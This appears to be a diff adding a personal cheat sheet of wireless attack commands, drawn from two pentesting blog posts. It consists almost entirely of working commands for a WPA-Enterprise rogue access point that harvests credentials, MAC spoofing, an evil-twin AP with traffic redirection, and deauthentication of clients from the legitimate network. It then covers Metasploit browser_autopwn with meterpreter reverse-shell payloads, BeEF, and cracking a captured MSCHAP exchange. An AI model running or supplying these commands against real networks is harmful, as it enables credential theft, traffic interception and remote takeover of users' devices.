@@ -1,0 +1,141 @@
+#### http://technicdynamic.com/?p=369
+#### http://securitysynapse.blogspot.com/2014/03/wireless-pentesting-on-cheap-kali-WPAEntPartII.html
+
+############### 802.1x Attacking ####################
+############### Get target MAC ######################
+
+sudo airmon-ng start wlan1 [channel]
+
+sudo iptables -A INPUT -p udp -s 10.0.0.1 --dport 1812 -i wlan1 -j ACCEPT 
+sudo iptables -A INPUT -p udp -s 10.0.0.1 --dport 1813 -i wlan1 -j ACCEPT 
+sudo iptables -A INPUT -p udp -s 10.0.0.1 --dport 1814 -i wlan1 -j ACCEPT
+sudo iptables -A INPUT -p tcp -s 10.0.0.1 --dport 1812 -i wlan1 -j ACCEPT 
+sudo iptables -A INPUT -p tcp -s 10.0.0.1 --dport 1813 -i wlan1 -j ACCEPT 
+sudo iptables -A INPUT -p tcp -s 10.0.0.1 --dport 1814 -i wlan1 -j ACCEPT
+sudo iptables -A INPUT -p udp -s 127.0.0.1 --dport 1812 -i wlan1 -j ACCEPT 
+sudo iptables -A INPUT -p udp -s 127.0.0.1 --dport 1813 -i wlan1 -j ACCEPT 
+sudo iptables -A INPUT -p udp -s 127.0.0.1 --dport 1814 -i wlan1 -j ACCEPT
+sudo iptables -A INPUT -p tcp -s 127.0.0.1 --dport 1812 -i wlan1 -j ACCEPT 
+sudo iptables -A INPUT -p tcp -s 127.0.0.1 --dport 1813 -i wlan1 -j ACCEPT 
+sudo iptables -A INPUT -p tcp -s 127.0.0.1 --dport 1814 -i wlan1 -j ACCEPT
+
+##### Run Wireshark to discover EAPOL specifics (EAP-TLS, PEAP, etc).
+00:c0:ca:59:82:97
+sudo ifconfig wlan1 down
+sudo ip link set dev wlan1 address 00:c0:ca:59:82:97<fake MAC>
+
+
+sudo radiusd -X -f -s
+#### sudo tail -f /usr/local/var/log/radius/radius.log 
+
+
+
+~/Applications/Network/freeradius-wpe/hostapd-2.2/hostapd$ sudo rfkill unblock wlan
+~/Applications/Network/freeradius-wpe/hostapd-2.2/hostapd$ sudo ifconfig wlan1 10.15.0.1/24 up
+~/Applications/Network/freeradius-wpe/hostapd-2.2/hostapd$ sudo ./hostapd-wpe hostapd.conf.old 
+
+sudo tail -f /usr/local/var/log/radius/freeradius-server-wpe.log
+
+
+
+
+################## Airplay settings #########################
+#### If encryption is set then a PSK is needed that matches the target AP.
+#### -z sets WPA1 tags. 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104
+#### -Z same as -z, but for WPA2
+
+sudo airbase-ng -e [Target ESSID] -c [channel] -Z 4 mon0 
+
+# or use this if no PSK is known
+
+sudo airbase-ng -e [Target ESSID] -c [Target channel] -a [Target AP MAC] mon0
+
+# WEP enabled AP w/ 1111111111 as the PSK
+airbase-ng e [Target ESSID] -c [Target channel] -w 1111111111 mon0
+
+# Airbase needs to be running for at0 to exist.
+
+sudo ifconfig at0 up
+
+sudo ifconfig at0 192.168.13.1 netmask 255.255.255.0
+
+sudo route add -net 192.168.13.0 netmask 255.255.255.0 gw 192.168.13.1
+
+sudo iptables -A INPUT -s 192.168.13.0/24 -i at0 -p tcp --sport 68 --dport 67 -j ACCEPT
+sudo iptables -A INPUT -s 192.168.13.0/24 -i at0 -p udp --sport 68 --dport 67 -j ACCEPT
+
+sudo iptables --flush
+
+sudo iptables --table nat --flush
+
+sudo iptables --delete-chain
+
+sudo iptables --table nat --delete-chain
+
+sudo iptables --table nat --append POSTROUTING --out-interface eth1 -j MASQUERADE
+
+sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
+
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward 
+
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination [ETH1 IP address:80]
+
+sudo iptables -t nat -A POSTROUTING -j MASQUERADE 
+
+### OR for something MUCH easier to setup; just make sure dnsmasq isn't running or DHCP is already in use
+sudo dnsmasq --dhcp-range=192.168.13.10,192.168.13.254,24h -i at0
+
+
+# Monitor leases issued
+sudo dhcpdump -i at0
+
+# Boot devices off legit network
+sudo aireplay-ng -0 0 -a [target bssid] -c [client mac] [monitor interface]
+# or
+sudo aireplay-ng -0 0 -a [target bssid] [monitor interface]
+
+
+############### Create Database ##########################
+
+### Login to MySQL: 
+
+mysql -u root -p 
+create database wpa2; 
+use wpa2; 
+create table content(key1 VARCHAR(64), key2 VARCHAR(64)); 
+
+############### To review results from capture  #############
+mysql
+show databases;
+use wpa2;
+select * from content;
+Show all mysql users & hashes:
+select User from mysql.user;
+
+# To delete all table entries:
+truncate table content;
+
+
+# Using Metasploit and BeEF
+service metasploit stop
+service postgresql start
+service apache2 start
+
+#Edit index.html and update IP with current IP & link below.
+msf  use auxiliary/server/browser_autopwn
+msf  auxiliary(browser_autopwn) > set LHOST 192.168.56.1
+msf  auxiliary(browser_autopwn) > set PAYLOAD_WIN32 windows/meterpreter/reverse_tcp 
+msf  auxiliary(browser_autopwn) > set PAYLOAD_JAVA java/meterpreter/reverse_tcp 
+exploit
+
+# To see the list of opened sessions type "sessions -l"
+# To connect/interact with that sessions type "sessions -i 1"
+
+# start armitage to start RPC service & use pass 
+/root/beef/beef
+
+
+
+
+## Crack MSCHAP 
+~/Applications/Network/asleap$ sudo ./asleap -C 9f:55:58:f3:27:72:12:4e -R 79:bc:55:2e:ef:0d:33:1e:ca:5f:75:93:0d:9e:14:e3:6d:78:9b:f5:61:0a:b8:7b -W /opt/wordlists/rockyouUni.txt
